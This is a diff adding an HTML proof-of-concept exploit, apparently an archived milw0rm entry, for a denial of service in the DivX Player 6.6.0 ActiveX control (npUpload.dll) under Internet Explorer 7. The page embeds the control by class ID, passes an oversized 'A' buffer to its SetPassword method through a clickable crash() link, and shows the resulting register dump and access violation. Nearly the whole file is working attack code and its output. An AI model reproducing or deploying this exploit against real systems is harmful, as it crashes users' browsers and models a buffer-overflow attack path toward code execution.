@@ -1,0 +1,38 @@
+<object id="divx" classid="clsid:D050D736-2D21-4723-AD58-5B541FFB6C11" style="display:none;">
+</object>
+
+<script>
+function crash() {
+var buff = '';
+for(i=0;i<=500;i++) {buff+="AAAAAAAAAA";}
+
+object = document.getElementById("divx");
+object.SetPassword(buff);
+}
+</script>
+
+<pre>
+<h3><u>DivX SetPassword (npUpload.dll) Denial of Service</u></h3>
+<b>Tested on IE 7 and Divx Player 6.6.0</b>
+
+<b>Registers:</b>
+
+EAX 00000000
+ECX FFFFFFFF
+EDX 0191CA50
+EBX 008E06E0
+ESP 0191C9E4
+EBP 0191CA50
+ESI 00000000
+EDI 00000000
+EIP 061F2B52 npUpload.061F2B52
+
+Access violation when reading [00000000]...
+
+
+<i>Discovered by shir, 02/01/2007</i>
+
+<a href="javascript:;" OnClick="crash()">Crash...</a>
+</pre>
+
+# milw0rm.com [2008-01-02]
